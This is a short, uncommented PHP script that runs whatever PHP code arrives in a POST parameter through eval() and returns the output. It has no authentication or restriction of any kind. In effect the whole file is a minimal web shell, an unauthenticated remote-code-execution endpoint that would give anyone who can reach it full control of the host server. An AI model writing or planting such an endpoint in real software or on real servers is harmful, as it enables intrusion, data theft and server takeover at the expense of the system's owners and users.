<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $phpCode = $_POST['phpCode'];

    ob_start();
    eval($phpCode);
    $output = ob_get_clean();

    echo $output;
}
?>
